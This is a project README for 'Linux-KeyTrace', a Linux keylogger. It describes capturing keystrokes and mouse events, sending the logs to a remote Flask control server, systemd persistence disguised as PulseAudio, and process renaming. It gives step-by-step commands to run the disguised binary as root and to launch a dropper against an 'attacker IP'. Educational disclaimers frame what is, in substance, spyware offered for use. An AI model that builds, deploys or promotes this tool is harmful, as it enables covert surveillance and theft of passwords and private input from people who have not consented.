
#  🔐 Linux-KeyTrace <sup><sub>v1.0</sub></sup>

![Linux-KeyTrace Banner](Banner.png)

**Linux-KeyTrace** is a Linux-based advanced keylogger built for cybersecurity research and awareness purposes. It captures keystrokes and mouse activity, logs them locally with timestamps, and periodically exfiltrates logs to a remote control server. It includes stealth features such as process renaming and service masquerading.

---

## ⚠️ Disclaimer

> This project is intended **strictly for educational and ethical security research purposes only**.  
> Do **not** use it on systems without **explicit authorization**.  
> The developer assumes **no responsibility** for misuse.

---

## 🔧 Features

- ✅ **Keyboard and Mouse logging** via `/dev/input` event interfaces    
- ✅ **Dynamic device discovery** (`/proc/bus/input/devices`)  
- ✅ **Remote control server** (Flask-based):  
  - Start, stop, cleanup commands  
  - Upload and download logs  
  - Serve payload binary  
- ✅ **Dropper script** to simulate infection  
- ✅ **Persistence** via systemd service (masqueraded as PulseAudio)  
- ✅ **Log exfiltration** every 60 seconds using `libcurl`  
- ✅ **Process disguise** (`pulseaudio`) and binary obfuscation  

---

## 📁 Project Structure

```
Linux-KeyTrace/
├── include/                # Header files
├── src/                    # Keylogger core logic
│   ├── device_finder.c     # Finds keyboard and mouse devices
│   ├── exfiltrator.c       # Sends logs to remote server, fetches commands
│   ├── keymap.c            # Maps keycodes to readable characters
│   ├── logger.c            # Captures and logs keystrokes/mouse events
│   └── main.c              # Main program: init, loop, cleanup
├── server/                 # Flask-based control server
│   ├── listener.py         # Control server backend
│   ├── control.txt         # Remote command file (run, stop, cleanup)
│   ├── ip.txt              # Stores IP used by client
│   └── received_logs/      # Incoming logs from clients
├── misc/                   # systemd service file
├── dropper.sh              # Simulates payload delivery
├── Makefile                # Build instructions
└── README.md               # Project info
```

---

## 🚀 Quick Setup

### 1. Build the Keylogger

```bash
make clean && make
```

---

### 2. Start the Control Server

```bash
cd server
source venv/bin/activate   # If using virtualenv
python3 listener.py
```

The server will start on `http://<your-ip>:8080`

---

### 3. Run the Keylogger (simulate infection)

**Terminal 1** (compile and run):

```bash
ps aux | grep pulseaudio
sudo kill <PID>            # Optional if testing
sudo ./pulseaudio          # Starts the keylogger
```

**Terminal 2** (server already running)

**Terminal 3** (simulate dropper execution):

```bash
./dropper.sh 127.0.0.1     # Replace with attacker IP
```

**Terminal 4** (view logs):

```bash
cd server/received_logs
tail -f keylog.txt
```

---

## 📌 Notes
 
- The keylogger requires **root permissions** to access `/dev/input/event*` devices.  
- Tested on modern Linux distributions with X11.  

---

## 🛡️ Legal Notice

This tool is designed for **red team training**, **ethical hacking labs**, or **controlled environments**.  
Unauthorized use **may violate privacy laws and computer misuse legislation** in your jurisdiction.

---

## 📫 Contact

For inquiries related to responsible usage, security research, or contributing to the project, please reach out via GitHub or your institutional contact channels.

## Author
Developed by Kunal Dharme.